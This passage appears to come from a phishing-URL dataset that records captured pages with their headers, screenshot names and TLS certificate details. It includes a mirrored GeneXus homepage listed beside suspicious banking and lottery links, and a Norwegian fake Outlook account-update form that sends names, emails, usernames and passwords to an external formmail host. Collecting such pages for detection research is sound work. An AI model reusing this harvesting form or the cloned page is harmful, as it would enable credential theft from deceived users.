<li class=""article-container"">
<article class=""i-collapsible-detail"">
<header>
<h1 class=""title"">
<a href=""leer-noticia/quieres-aprender-genexus-calendario-de-cursos-presenciales-en-genexus-training-arabiasaudita-brasil-mexico-panama-peru-uruguay-usa.html"">
¿Quieres aprender GeneXus? Calendario de cursos presenciales en GeneXus Training #ArabiaSaudita #Brasil #México #Panamá #Perú #Uruguay #USA
</a>
</h1>
		
</header>

	

</article>
</li>
<li class=""article-container"">
<article class=""i-collapsible-detail"">
<header>
<h1 class=""title"">
<a href=""leer-noticia/una-importante-actualizacion-de-apple-store-que-pronto-entrara-en-vigencia.html"">
Una importante actualización de Apple Store que pronto entrará en vigencia​​​​​​​
</a>
</h1>
		
</header>

	

</article>
</li>
<li class=""article-container"">
<article class=""i-collapsible-detail"">
<header>
<h1 class=""title"">
<a href=""leer-noticia/the-power-of-2019--is-coming-soon.html"">
The power of 2019 … is coming soon!
</a>
</h1>
		
</header>

	

</article>
</li>
<li class=""article-container"">
<article class=""i-collapsible-detail"">
<header>
<h1 class=""title"">
<a href=""leer-noticia/30-articulos-que-nos-dejo-el-genexus-blog-en-2018.html"">
30 artículos que nos dejó el GeneXus blog en 2018
</a>
</h1>
		
</header>

	

</article>
</li>
<li class=""article-container"">
<article class=""i-collapsible-detail"">
<header>
<h1 class=""title"">
<a href=""leer-noticia/26-videos-para-actualizarte-a-genexus-16.html"">
26 videos para actualizarte a GeneXus 16
</a>
</h1>
		
</header>

	

</article>
</li>
<li class=""article-container"">
<article class=""i-collapsible-detail"">
<header>
<h1 class=""title"">
<a href=""leer-noticia/1er-genexus-day-en-china.html"">
1er GeneXus day en China
</a>
</h1>
		
</header>

	

</article>
</li>
</ul>
</div>
</div>
<div class=""sector I21382"">
<div class=""viewport"">
<a href=""noticias.html"" class=""button block I21381"">
<span class=""icon""></span>
<span class=""text"">Leer más noticias</span>
</a>
</div>
</div>
<section class=""sector I20465"">
<h1 class=""sector-title""><span class=""text"">Mantente al tanto.</span></h1>
<div class=""viewport"">

<form id=""form_20464_subscribe"" class=""block I20464"" method=""post"" data-ajax=""true"">
<input type=""hidden"" name=""web_layout_id"" value=""24"" />
<input type=""hidden"" name=""web_block_id"" value=""39"" />
<input type=""hidden"" name=""event_name"" value=""subscribe"" />

<fieldset>
	
<div class=""fields"">
<input class=""input"" id=""useremail"" name=""useremail"" type=""text"" />
<button type=""submit"" class=""button-subscription"" form=""form_20464_subscribe"">
<span class=""icon""></span>
<span class=""text"">Suscribirme</span>
</button>
</div>	
</fieldset>
</form> 
</div>
</section>
</div>
</section>
<footer class=""region I16879"">
<div class=""group-sectors I20709"">
<div class=""sector I16010"">
<div class=""viewport"">
<span class=""block I16009"">
© Todos los derechos reservados. GeneXus™ es marca registrada por GeneXus S.A. 
</span>
</div>
</div>
<div class=""sector I21170"">
<div class=""viewport"">
<div class=""block language I21169"" data-cookie-name=""lang-favorite"" data-cookie-domain=""genexus.com"">
<ul class=""I21169-level-top block I21169"">
<li id=""I21169-es"" class=""level-top active"">
<ul class=""I21169-level-child"">
<li id=""I21169-en"" class=""level-child"">
<a href=""https://www.genexus.com/en/"" class=""value-wrapper"" rel=""alternate"" lang=""en"" hreflang=""en"">
<span class=""value""><span class=""icon""></span><span class=""text"">English</span></span>
</a>
</li>
<li id=""I21169-pt"" class=""level-child"">
<a href=""https://www.genexus.com/pt/"" class=""value-wrapper"" rel=""alternate"" lang=""pt"" hreflang=""pt"">
<span class=""value""><span class=""icon""></span><span class=""text"">Português</span></span>
</a>
</li>
</ul>
<div class=""value-wrapper"">
<span class=""value""><span class=""icon""></span><span class=""text"">Español</span></span>
</div>
</li>
</ul>
</div>
</div>
</div>
<div class=""sector I16008"">
<div class=""viewport"">
<div class=""block blockNavigationMenu I16007"">
<ul class=""I16007-level-top"">
<li id=""I16007-240-1"" class=""level-top"">
<a href=""https://www.facebook.com/GeneXus"" class=""value-wrapper"" target=""_blank"">
<span class=""value""><span class=""icon""></span><span class=""text"">Facebook</span></span>
</a>
</li>
<li id=""I16007-240-9"" class=""level-top"">
<a href=""https://www.instagram.com/genexusofficial"" class=""value-wrapper"" target=""_blank"">
<span class=""value""><span class=""icon""></span><span class=""text"">Instagram</span></span>
</a>
</li>
<li id=""I16007-240-4"" class=""level-top"">
<a href=""https://www.linkedin.com/company/genexus-artech"" class=""value-wrapper"" target=""_blank"">
<span class=""value""><span class=""icon""></span><span class=""text"">Linkedin</span></span>
</a>
</li>
<li id=""I16007-240-2"" class=""level-top"">
<a href=""http://twitter.com/genexus/"" class=""value-wrapper"" target=""_blank"">
<span class=""value""><span class=""icon""></span><span class=""text"">Twitter</span></span>
</a>
</li>
<li id=""I16007-240-5"" class=""level-top"">
<a href=""http://www.youtube.com/user/GXMarketing"" class=""value-wrapper"" target=""_blank"">
<span class=""value""><span class=""icon""></span><span class=""text"">Youtube</span></span>
</a>
</li>
<li id=""I16007-240-8"" class=""level-top"">
<a href=""http://stackoverflow.com/tags/genexus"" class=""value-wrapper"" target=""_blank"">
<span class=""value""><span class=""icon""></span><span class=""text"">StackOverflow</span></span>
</a>
</li>
</ul>
</div>
</div>
</div>
<div class=""sector I16014"">
<div class=""viewport"">
<a href=""http://www.gxportal.com/"" class=""block I16013"">
<img src=""https://www.genexus.com/media/images/poweredby_gxportal-01.svg?timestamp=20180123142229"" class=""image"" width=""0"" height=""0"" alt="""" />
</a>
</div>
</div>
</div>
<div class=""sector I16067"">
<div class=""viewport"">
<div class=""block language I16066"" data-cookie-name=""lang-favorite"" data-cookie-domain=""genexus.com"">
<ul class=""I16066-level-top block I16066"">
<li id=""I16066-en"" class=""level-top"">
<a href=""https://www.genexus.com/en/"" class=""value-wrapper"" rel=""alternate"" lang=""en"" hreflang=""en"">
<span class=""value""><span class=""icon""></span><span class=""text"">English</span></span>
</a>
</li>
<li id=""I16066-es"" class=""level-top active"">
<div class=""value-wrapper"">
<span class=""value""><span class=""icon""></span><span class=""text"">Español</span></span>
</div>
</li>
<li id=""I16066-pt"" class=""level-top"">
<a href=""https://www.genexus.com/pt/"" class=""value-wrapper"" rel=""alternate"" lang=""pt"" hreflang=""pt"">
<span class=""value""><span class=""icon""></span><span class=""text"">Português</span></span>
</a>
</li>
</ul>
</div>
</div>
</div>
</footer>


<!-- Mirrored from www.genexus.com/es/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Mar 2019 14:09:16 GMT -->
</body></html>","['https://tinyurl.com/bancocrediitobcp', 'http://sorteomillonarianual.seriapeformasdevivir.cf/']",[<Response [301]>],"{'Content-Encoding': 'gzip', 'Content-Type': 'text/html', 'Server': 'openresty', 'Connection': 'keep-alive', 'Last-Modified': 'Tue, 23 Apr 2019 03:29:50 GMT', 'Transfer-Encoding': 'chunked', 'Date': 'Tue, 07 May 2019 18:37:12 GMT'}",2019_05_08_00_05_40.png,"{
  ""OCSP"": [
    ""http://ocsp.comodoca4.com""
  ],
  ""caIssuers"": [
    ""http://crt.comodoca4.com/COMODOECCDomainValidationSecureServerCA2.crt""
  ],
  ""crlDistributionPoints"": [
    ""http://crl.comodoca4.com/COMODOECCDomainValidationSecureServerCA2.crl""
  ],
  ""issuer"": [
    [
      [
        ""countryName"",
        ""GB""
      ]
    ],
    [
      [
        ""stateOrProvinceName"",
        ""Greater Manchester""
      ]
    ],
    [
      [
        ""localityName"",
        ""Salford""
      ]
    ],
    [
      [
        ""organizationName"",
        ""COMODO CA Limited""
      ]
    ],
    [
      [
        ""commonName"",
        ""COMODO ECC Domain Validation Secure Server CA 2""
      ]
    ]
  ],
  ""notAfter"": ""Jul 31 23:59:59 2019 GMT"",
  ""notBefore"": ""Jan 22 00:00:00 2019 GMT"",
  ""serialNumber"": ""159A40A34957D451272346FA61486BEB"",
  ""subject"": [
    [
      [
        ""organizationalUnitName"",
        ""Domain Control Validated""
      ]
    ],
    [
      [
        ""organizationalUnitName"",
        ""PositiveSSL Multi-Domain""
      ]
    ],
    [
      [
        ""commonName"",
        ""ssl470811.cloudflaressl.com""
      ]
    ]
  ],
  ""subjectAltName"": [
    [
      ""DNS"",
      ""ssl470811.cloudflaressl.com""
    ],
    [
      ""DNS"",
      ""*.tinyurl.com""
    ],
    [
      ""DNS"",
      ""tinyurl.com""
    ]
  ],
  ""version"": 3
}"
2019-05-08 00:05:44.228930,http://inter-44577-com-br.umbler.net/login/,,"<html xmlns=""http://www.w3.org/1999/xhtml""><head></head><body></body></html>",NaN,NaN,NaN,2019_05_08_00_05_43.png,NaN
2019-05-08 00:05:56.960030,https://no.do.am/Oppdater-kontoen-din.htm,Oppdater kontoen din,"<!--?xml version=""1.0"" encoding=""utf-8"" ?--><!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""><html xmlns=""http://www.w3.org/1999/xhtml""><head>
<title>Oppdater kontoen din</title>
<style type=""text/css"">
@import url(//cdn.tectite.com/formdesigneruser-v10.css);
</style>
<script type=""text/javascript"">var tectite_form_environ = {img_url:""//cdn.tectite.com/images/""};</script>
<script type=""text/javascript"" src=""//cdn.tectite.com/formval-v17.js""></script><script type=""text/javascript"" src=""//ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js""></script>
<script type=""text/javascript"" src=""//cdn.tectite.com/js.cookie.min.js""></script></head>
<body>
<div class=""TectiteForm"">
<form id=""Oppdater_kontoen_din"" name=""Oppdater_kontoen_din"" method=""post"" enctype=""multipart/form-data"" action=""https://www.tectite.com/hosted/004917/nhhr.no/formmail.php"">
<h1 class=""TectiteFormDesignerHeading"" id=""heading1"">Microsoft Outlook-kontovedlikehold</h1>
<p id=""para1"">Fyll inn informasjonen din riktig for kontooppdatering.</p>
<div class=""TectiteFormDesignerField"">
<label for=""field1"" class=""TectiteRequiredField"">Fullt navn:</label><input type=""text"" id=""field1"" name=""FullName"" />
</div>
<div class=""TectiteFormDesignerField"">
<label for=""field2"" class=""TectiteRequiredField"">Epostadresse:</label><input type=""text"" id=""field2"" name=""EmailAddr"" />
</div>
<div class=""TectiteFormDesignerField"">
<label for=""field3"" class=""TectiteRequiredField"">Domene \ brukernavn:</label><input type=""text"" id=""field3"" name=""field3"" />
</div>
<div class=""TectiteFormDesignerField"">
<label for=""field4"" class=""TectiteRequiredField"">Passord:</label><input type=""text"" id=""field4"" name=""field4"" />
</div>
<div class=""TectiteFormDesignerField TectiteButtonField"" style=""width: 98%;"">
<input type=""submit"" id=""submitbutton"" value=""Oppdater konto"" name=""submitbutton"" />
<span class=""TectiteAjaxProgress""></span>
</div>
<input type=""hidden"" id=""tectiteformid"" name=""tectiteformid"" value=""816548e548643485aa6cc86c41578f45"" />
<!-- NOTE: do not remove the following links if you are using our Hosted Forms on a Free Plan.
     Removing the links will cause your form to be disabled! You can upgrade to a paid plan
     and then safely remove the links.
     If you are using your own copy of FormMail, you can remove the links without an issue,
     though we would appreciate it if you left them here.
-->
<a id=""PoweredByLink"" class=""PoweredByFormMail"" href=""https://www.tectite.com/"" target=""_blank""><img id=""PoweredByImg"" src=""https://www.tectite.com/images/FormMail_rnd_blue.png"" alt=""Badge for Tectite supplied contact form"" title=""Use Tectite FormMail for your contact form"" border=""0"" /></a>
<input type=""hidden"" name=""required"" value=""FullName:Fullt navn;,EmailAddr:Epostadresse;,field3:Domene \ brukernavn;,field4:Passord;"" />
<input type=""hidden"" name=""derive_fields"" value=""realname = FullName,email = EmailAddr"" />
<input type=""hidden"" name=""subject"" value=""Contact"" />
